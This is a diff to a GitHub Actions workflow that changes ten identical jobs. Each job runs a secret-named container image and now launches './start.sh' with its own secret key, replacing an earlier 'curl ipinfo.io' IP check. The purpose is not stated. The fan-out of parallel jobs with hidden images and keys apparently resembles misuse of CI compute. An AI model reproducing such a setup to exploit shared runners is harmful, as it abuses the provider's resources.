@@ -14,9 +14,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY1 }}" ./start.sh
+            # shell: bash
 
  check02:
     runs-on: ubuntu-latest
@@ -30,9 +29,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY2 }}" ./start.sh
+            # shell: bash
 
  check03:
     runs-on: ubuntu-latest
@@ -46,9 +44,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY3 }}" ./start.sh
+            # shell: bash
 
  check04:
     runs-on: ubuntu-latest
@@ -62,9 +59,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY4 }}" ./start.sh
+            # shell: bash
 
  check05:
     runs-on: ubuntu-latest
@@ -78,9 +74,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY5 }}" ./start.sh
+            # shell: bash
 
  check06:
     runs-on: ubuntu-latest
@@ -94,9 +89,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY6 }}" ./start.sh
+            # shell: bash
 
  check07:
     runs-on: ubuntu-latest
@@ -110,9 +104,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY7 }}" ./start.sh
+            # shell: bash
 
  check08:
     runs-on: ubuntu-latest
@@ -126,9 +119,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY8 }}" ./start.sh
+            # shell: bash
 
  check09:
     runs-on: ubuntu-latest
@@ -142,9 +134,8 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY9 }}" ./start.sh
+            # shell: bash
 
  check10:
     runs-on: ubuntu-latest
@@ -158,6 +149,5 @@ jobs:
         with:
             image: ${{ secrets.IMAGE }}
             run: |
-                curl ipinfo.io
-                sleep 5
-            shell: bash
+                KEY="${{ secrets.CRKEY10 }}" ./start.sh
+            # shell: bash
